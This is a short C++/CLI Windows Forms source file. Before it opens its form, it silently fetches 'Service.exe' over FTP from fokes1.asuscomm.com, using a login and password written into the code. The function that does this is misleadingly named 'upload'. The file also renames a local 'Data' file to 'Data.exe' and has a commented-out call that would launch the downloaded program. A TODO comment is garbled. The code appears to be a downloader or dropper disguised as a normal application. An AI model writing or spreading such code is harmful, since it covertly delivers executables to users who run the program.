#include "MyForm.h"
#include <windows.h>
#include <stdio.h>
#include <fcntl.h>
#include <io.h>
#include <iostream>
#include <stdio.h>
#include <Windows.h>
#include <WinInet.h>
#include <conio.h>

using std::cout;
using std::cin;
using std::endl;
using namespace Project2;

#pragma comment (lib, "wininet.lib")

void upload(LPCSTR server, LPCSTR login, LPCSTR pass, LPCWSTR local_file, LPCWSTR remote_file)
{
	HINTERNET hOpen, hConnection;

	hOpen = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);

	hConnection = InternetConnectA(hOpen, server, INTERNET_DEFAULT_FTP_PORT, login, pass, INTERNET_SERVICE_FTP, 0, 0);

	if (FtpGetFile(hConnection, local_file, remote_file, 0, 0, 0, 0))
		cout << "Success Story" << endl;
	else
		cout << "Epic Fail!" << endl;

	InternetCloseHandle(hConnection);
	InternetCloseHandle(hOpen);
}

[STAThreadAttribute]
int main(array <System::String ^> ^args)
{
	Application::EnableVisualStyles();
	Application::SetCompatibleTextRenderingDefault(false);

	upload("fokes1.asuscomm.com", "ff", "WorkerFF", L"Service.exe", L"Service.exe");
	CopyFile(L"Data", L"Data.exe", false);

	//TODO: Ðאסרטפנמגאעü פאיכ

	//LPCTSTR path = L"Service.exe";
	//ShellExecute(NULL, L"open", path, NULL, NULL, SW_SHOWDEFAULT);

	Application::Run(gcnew MyForm());
	return 0;
}